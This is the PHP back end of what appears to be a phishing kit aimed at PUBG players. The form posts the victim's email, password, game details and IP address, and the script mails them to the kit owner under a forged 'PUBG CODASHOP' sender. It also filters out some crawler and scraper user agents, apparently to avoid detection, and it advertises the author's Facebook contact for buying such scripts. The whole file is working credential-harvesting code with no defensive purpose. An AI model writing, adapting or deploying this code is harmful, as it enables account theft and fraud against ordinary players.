<?php 
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('http://idhaampedia.me/404.php');
die();
}
if(isset($_POST['loginData'])) {
    $prov   = $_POST['prov'];
    $email  = $_POST['user'];
    $pass   = $_POST['pass'];
    $nick   = $_POST['nick'];
    $count  = $_POST['country'];
    $rpt    = $_POST['rpt'];
    $rpl    = $_POST['rpl'];
    $tier   = $_POST['tier'];
    $level  = $_POST['level'];
    $device = $_POST['device'];

    $ipaddress = '';
    if ($_SERVER['HTTP_CLIENT_IP'] != '127.0.0.1')
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if ($_SERVER['HTTP_X_FORWARDED_FOR'] != '127.0.0.1')
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if ($_SERVER['HTTP_X_FORWARDED'] != '127.0.0.1')
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if ($_SERVER['HTTP_FORWARDED_FOR'] != '127.0.0.1')
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if ($_SERVER['HTTP_FORWARDED'] != '127.0.0.1')
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if ($_SERVER['REMOTE_ADDR'] != '127.0.0.1')
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';

    include"../email.php";
    $nickName = ucfirst($nick);
    $subject = "Akun PUBG Log $prov | $nickName";
    $body = <<<EOD
        <pre style='font-size: 1.1em;'>
        <table>
        <tr>
            <th colspan="3" align="left">AKUN PUBG FRESH SANGAD</th>
        </tr>
        <tr>
            <td>&nbsp;</td>
        </tr>
        <tr>
            <td>Email</td>
            <td>:</td>
            <td>$email</td>
        </tr>
        <tr>
            <td>Password</td>
            <td>:</td>
            <td>$pass</td>
        </tr>
        <tr>
            <td>&nbsp;</td>
        </tr>
        <tr>
            <th colspan="3" align="left">DETAIL AKUN</th>
        </tr>
        <tr>
            <td>Nickname</td>
            <td>:</td>
            <td>$nick</td>
        </tr>
        <tr>
            <td>Level</td>
            <td>:</td>
            <td>$lvl</td>
        </tr>
        <tr>
            <td>Tier</td>
            <td>:</td>
            <td>$tier</td>
        </tr>
        <tr>
            <td>Tipe RP</td>
            <td>:</td>
            <td>$rpt</td>
        </tr>
        <tr>
            <td>Level RP</td>
            <td>:</td>
            <td>$rpl</td>
        </tr>
        <tr>
            <td>Country</td>
            <td>:</td>
            <td>$count</td>
        </tr>
        <tr>
            <td>Device</td>
            <td>:</td>
            <td>$device</td>
        </tr>
        <tr>
            <td>IP Address</td>
            <td>:</td>
            <td>$ipaddress</td>
        </tr>
        <tr>
            <td>&nbsp;</td>
        </tr>
        <tr>
            <th colspan="3" align="left">Terima Kasih</th>
        </tr>
        <tr>
            <td>&nbsp;</td>
        </tr>
        <tr>
            <th colspan="3" align="left">Beli SC keren? Chat <a href="https://www.facebook.com/IdhamDotID">Idhaam69</a>.</th>
        </tr>
        </table>
        </pre>
EOD;
    $headersx = 'MIME-Version: 1.0' . "\r\n"; 
    $headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n"; 
    $headersx .= 'From: PUBG CODASHOP <result@idhaam>' . "\r\n"; 
    $kirim    = mail($mailto, $subject, $body, $headersx);
    if($kirim) {
        session_start();
        $_SESSION['nick'] = $nick;
        header('location: success.php');
    }
}

?>